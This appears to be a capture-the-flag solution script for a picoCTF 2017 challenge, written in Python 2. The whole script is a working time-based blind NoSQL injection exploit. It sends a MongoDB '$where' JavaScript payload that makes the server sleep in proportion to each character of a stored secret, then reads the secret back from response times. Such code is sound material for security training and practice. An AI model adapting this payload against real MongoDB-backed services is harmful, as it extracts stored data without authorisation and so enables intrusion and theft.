import requests
import json 

url = "http://shell2017.picoctf.com:8080/search"


for i in range(0, 40):
    freq = {}
    for j in range(0, 4):
        obj = { 
            "$where" : "function() { if (Object.prototype.toString.call(this.flag) == '[object String]') sleep(this.flag.charCodeAt(%d)*20); else sleep(1);  }" % (i) 
        }
        r = requests.post(url, data=json.dumps(obj), headers={'Content-Type' : 'application/json'})
        j = json.loads(r.text)
        ch = int(j['time'])/20
        if not ch in freq:
            freq[ch] = 0
        freq[ch] += 1
    print chr(sorted(freq.items(), key=lambda x: x[1], reverse=True)[0][0]),